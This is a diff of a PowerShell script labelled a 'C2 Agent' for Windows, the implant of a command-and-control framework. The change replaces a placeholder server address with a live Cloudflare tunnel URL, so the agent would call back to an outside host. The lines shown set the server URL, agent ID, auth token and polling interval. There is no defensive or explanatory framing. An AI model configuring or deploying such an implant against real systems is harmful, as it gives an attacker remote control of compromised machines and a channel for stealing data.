@@ -1,5 +1,5 @@
 # C2 Agent — Windows PowerShell (Windows 7+ / .NET 4+)
-$C2      = if ($env:C2_URL)    { $env:C2_URL }    else { "http://CHANGE_ME:443" }
+$C2      = if ($env:C2_URL)    { $env:C2_URL }    else { "https://likelihood-lightweight-crossing-covering.trycloudflare.com" }
 $AgentId = if ($env:AGENT_ID)  { $env:AGENT_ID }  else { [guid]::NewGuid().ToString() }
 $Token   = if ($env:AUTH_TOKEN){ $env:AUTH_TOKEN } else { "" }
 $Sleep   = if ($env:SLEEP)     { [int]$env:SLEEP } else { 5 }
